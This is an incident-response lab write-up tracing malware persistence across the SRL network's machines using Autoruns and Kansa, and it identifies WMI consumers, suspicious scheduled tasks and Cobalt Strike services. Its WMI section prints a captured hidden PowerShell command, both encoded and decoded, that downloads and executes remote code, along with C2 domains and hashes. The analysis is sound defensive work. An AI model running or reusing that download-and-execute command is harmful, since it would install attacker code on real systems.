# Persistence of Malware

Persistence is one of the most important concepts in Digital Forensics and Incident Response, referring to how malware persists in a compromised environment. To survive initial detection or removal attempts, attackers utilize several methods that allow their malware to keep running. The following write-up will explain these methods in detail, covering a few key persistence mechanisms in depth:

## AutoStart Locations

We will go through some of the standard registry keys, startup folders, and autorun entries that malware usually uses to auto-launch at system boot or user logon.

## Creation/Replacement of Services

Unauthorized or suspicious Windows services often indicate malware trying to embed itself into legitimate system operations. We will examine these services for any potential threats.

## Service Failure Recovery

Many advanced malware variants have mechanisms to ensure that once the malware crashes or is terminated, it restarts. This section will explore mechanisms for such restarts.

## Scheduled Tasks

Malware can leverage Windows Task Scheduler to execute malicious binaries at a specific time or interval. We will search for scheduled tasks serving malicious purposes.

## DLL Hijacking

Dynamic Link Libraries (DLLs) are vulnerable to manipulations by attackers, allowing them to redirect legitimate calls to malicious code. We'll walk through DLL paths to identify any potential hijacking.

## WMI Event Consumers

Windows Management Instrumentation (WMI) may be used to execute code based on events occurring within a system. We will check for any malicious subscriptions of events that could potentially trigger harm.

## Advanced Searches

In addition to the above, deep searches for other less common persistence mechanisms, such as Local Group Policy changes, MS Office Add-Ins, and BIOS flashing techniques, will be carried out.

Through structured exploration of these persistence mechanisms, we hope to determine exactly how malware has gained a foothold in the SRL network, thus informing mitigation strategies.


![alt text](/images/writeup2/persistance.png)

---

# Persistence Mechanism Analysis on SRL Network

To develop our persistence mechanism analysis, we used various tools to identify and analyze malware persistence mechanisms throughout the SRL network. The chief tools were **Autoruns** and the **Kansa Incident Response Framework**, allowing us to automate autorun entry extraction from live machines.

### 1. Autoruns Overview

Autoruns is a powerful utility that allows us to track and trace persistence mechanisms across a variety of system locations. For this investigation, the Kansa tool was run on the **base-rd-01** machine as a wrapper for multiple PowerShell scripts, enabling us to extract all the autorun data for further examination , and this is the output csv files for all machines

  ![Filter for Verified Signatures](/images/writeup2/1.png)

#### Preliminary Findings

We started our investigation with an analysis of the Autoruns output, which contained **1,397 entries** to be examined. 

![Filter for Verified Signatures](/images/writeup2/pic2.png)

 To fine-tune our analysis, we applied several filters:

1. **Verified Signatures**: Entries from trusted vendors like Microsoft, Adobe, and Google were excluded.  NOTE: ( I include some of verified entries but I don't see important things , so let's go to important ones . )

   ![Filter for Verified Signatures](/images/writeup2/3.png)

2. **Empty Value Entries**: We filtered out entries lacking values to focus on potentially relevant data.

   ![Filter for Empty Values](/images/writeup2/4.png)


After filtering, we narrowed down our focus to a more manageable set of entries categorized for further investigation.

### 2. Detailed Investigation

#### 2.1 WMI Event Consumers

**Entry Found**: `SystemPerformanceMonitor` running a suspicious command in PowerShell:
```powershell
powershell -W Hidden -nop -noni -ec SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA
```

**Decoding**: The command appears to be Base64 encoded. We decoded this with the help of CyberChef:
```powershell
IEX (New-Object System.Net.WebClient).downloadstring('http://squirreldirectory.com/a')
```
- **Analysis**: This indicates a fileless attack, where the attacker downloads a file directly into memory using PowerShell.

#### 2.2 Services

- **VMware Services**:

![VMware Services](/images/writeup2/6.png)
  + Three entries were observed related to VMware; based on hash and document verification, these were considered legitimate.
   

#### 2.3 Drivers

![VMware Services](/images/writeup2/7.png)

- **Driver Identified**: `mfeavfk01.sys`
  + **Path**: `C:\WINDOWS\System32\Drivers\mfeavfk01.sys`
- **Status**: Not detected on the system.
  - **Research Findings**: This is an associated McAfee driver used as a filter driver; therefore, it's clean.

#### 2.4 Logon Entries
![VMware Services](/images/writeup2/p8.png)
- **First Entry**: Launch string pointing to a command that deletes a specific OneDrive folder:
  ```powershell
  C:\WINDOWS\system32\cmd.exe /q /c rmdir /s /q "C:\Users\tdungan\AppData\Local\Microsoft\OneDrive\18.131.0701.0007"
  ```
- **Second Entry**: A similar command on another OneDrive subfolder that was present in the RunOnce key, pointing to normal behavior regarding cleanup processes.

- **Last Entry**: Launches the command `C:\WINDOWS\inf\unregmp2.exe`, belonging to Microsoft Windows Media Player; however, this file was not present on the disk. Further investigation confirmed it as a valid entry.

#### 2.5 Scheduled Tasks 

![Scheduled Tasks](/images/writeup2/9.png)

- **Identified Tasks**: There were five tasks in total; four were related to updating OneDrive.
- **Suspicious Task**: "Collect Background Statistics," which attempts to execute an executable file from a temporary folder that doesn't exist (`C:\Windows\Temp\1.bat`).
   

#### 2.6 Office Add-ins
![Office Add-ins](/images/writeup2/10.png)
- Further investigation indicated that the Office add-ins pointed out were legitimate and not malicious.
   

### 3. Summary of Interesting Findings for base-rd-01 machine only

1. **WMI Consumer**: The entry `SystemPerformanceMonitor` downloads a file from `http://squirreldirectory.com/a` using PowerShell, indicative of a suspicious persistence mechanism.
2. **Scheduled Task**: The "Collect Background Statistics" task runs a suspicious script from the temp folder called `1.bat`, which no longer exists; this could indicate compromise.
3. **Driver Analysis**: The McAfee-related `mfeavfk01.sys` is likely a leftover from something that was uninstalled.
5. **RunOnce Entries**: These entries relate to cleaning up OneDrive and are expected, showing no signs of malicious behavior.



---
## **Autoruns Analysis for all SRL Machines**


## **Base-RD-02**
- **WMI Event Consumer**: Detected a suspicious event consumer named `SystemPerformanceMonitor`, identical to what was found on Base-RD-01.
  - The event consumer can execute a PowerShell command or script, a common tactic used by malware.

---

## **Base-RD-04**
- **Domain User**: The primary domain user on this machine is `nromanoff`.
- **Anomalous Run Key**: A Run key for `OneDrive.exe` was detected, associated with a different user `spsql`. Although `OneDrive.exe` is a legitimate executable, the `spsql` account is not a valid user within the environment.
  - **Possible Compromise**: This suggests a potential persistence mechanism by using a non-existent user. Further investigation is required to trace `spsql`'s presence across other systems.

---

## **Base-RD-05**
- **WMI Event Consumer**: Detected a suspicious WMI event consumer named `BVTConsumer`.
  - **Payload**: This consumer is set to run a VBA script named `KernCap.vbs`.
  - **Analysis**: This indicates a persistence method utilizing scripting, which deviates from the `SystemPerformanceMonitor` approach seen earlier.

---

## **Base-RD-06**
- **WMI Event Consumer**: Detected the same `BVTConsumer` entry as in Base-RD-05.
  - **Observation**: The attacker appears to be using consistent persistence techniques across different machines.

---

## **Base-WKSTN-01**
- **Domain User**: The main domain user on this machine is `mhill`.
- **RunOnce Key**: A `RunOnce` entry was identified to delete OneDrive folders for the same user `spsql` found on Base-RD-04.
  - **User Tracking**: This suggests that `spsql` has been active on multiple systems, raising concerns about potential lateral movement.

---

## **Base-WKSTN-02**
- **Scheduled Task**: Found a suspicious scheduled task under `\Microsoft\Windows\Chkdsk`.
  - **Task Name**: `Disk Check`
  - **Payload**: This task runs a suspicious DLL named `SystemSettings.dll` using the command `rundll32.exe`.
  - **Command**: `"C:\Windows\System32\rundll32.exe" C:\Windows\SystemSettings.dll,Defrag`
- **Indicator of Compromise (IOC)**:
  - **DLL MD5**: `74544c7c0d161d4e58aa98048a0fc0e9` — flagged as **malicious** by VirusTotal.
  - **Associated Malware**: Identified as **Cobalt Strike**.
  - **Communication Details**:
    - **C2 Server**: `forusnews.com`
    - **Network Traffic**: TCP `172.16.4.10:3128`
- **Persistence & Stealth**: The DLL uses HTTPS for encrypted communication, making it harder to detect. Its use of legitimate system utilities (e.g., `rundll32.exe`) suggests a focus on stealth and persistence.

![](/images/writeup2/12.png)

---

## **Base-WKSTN-03**
- **Malicious Service**: Discovered a malicious service named `PerfSvc.exe` located at `C:\Windows\syswow64\perfsvc.exe`.
  - **Launch String**: `C:\Windows\system32\PerfSvc.exe`
  - **Malicious Indicators**: The file hash `596bd34fc0d80e316b2a5131f283cb10` is associated with **Cobalt Strike**.
  - **Communication**: This service communicates with the following domains:
    - `armmf.adobe.com`
    - `www.usertrust.com`
    - `http://206.189.69.35/ye2M`
  - **Installation Date**: This service was installed on **April 4, 2018**, indicating that the attackers have been present since that time.
  ![](/images/writeup2/13.png)
- **Scheduled Tasks**: Four suspicious scheduled tasks were found under the `systemprofile` folder, all linked to `OneDriveUpdater`.
  - **Executable Location**: `C:\WINDOWS\system32\config\systemprofile\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe`
  - **Legitimacy Verification**: These tasks exist on multiple systems, but the purpose and origin need to be validated to confirm whether they are legitimate.



---

## **Base-WKSTN-05**
- **Malicious Service**: Detected a service named `perfmonsvc64.exe` located at `C:\Windows\system32\perfmonsvc64.exe`.
  - **Malicious Indicators**: VirusTotal flagged the file hash `42477dd9317c739043d4516e04221743e00b737d1234f914a0e7608202758972` as **malicious**.
  - **Associated Malware**: Identified as **Cobalt Strike**.
  - **Capabilities**: The service can drop files, create additional services, and establish C2 communication.
  - **Installation Date**: Installed on **April 4, 2018**, aligning with the other malicious services found.
  
- **WMI Event Consumers**: Detected both `SystemPerformanceMonitor` and `BVTConsumer`, mirroring the entries found on other systems.

![](/images/writeup2/14.png)

---

## **Base-WKSTN-06**
- **WMI Event Consumer**: Detected multiple WMI consumers, including `BVTConsumer` and the script `KernCap.vbs`, similar to other systems.

---

## **Other Systems**
- No major persistence mechanisms or abnormalities were identified on other systems.

---

# Key Observations
1. **Cobalt Strike Persistence**:
   - Multiple instances of Cobalt Strike components were found on various systems, including the services `PerfSvc.exe` and `perfmonsvc64.exe`, as well as malicious DLLs (`SystemSettings.dll`).
   - The use of legitimate tools (e.g., `rundll32.exe` and Windows services) suggests a strong focus on persistence and stealth.

2. **Suspicious User Activity**:
   - The presence of `spsql`, an unknown user account, on multiple systems raises concerns about unauthorized activity.
   - Further review is required to trace `spsql`'s actions and determine the extent of the intrusion.

3. **WMI Event Consumers**:
   - Various WMI consumers (`SystemPerformanceMonitor`, `BVTConsumer`) and suspicious scheduled tasks were used by the attacker to maintain persistence.

---




## IRSpreadsheet Document
At the end of the investigation, I will provide an **IRSpreadsheet document** that outlines the attacker's behavior across all systems.

![15.png](/images/writeup2/15.png)

We will use this sheet throughout the entire investigation, and you can access the document here:

[IRSpreadsheet.xlsx](images/writeup2/IRSpreadsheet.xlsx)
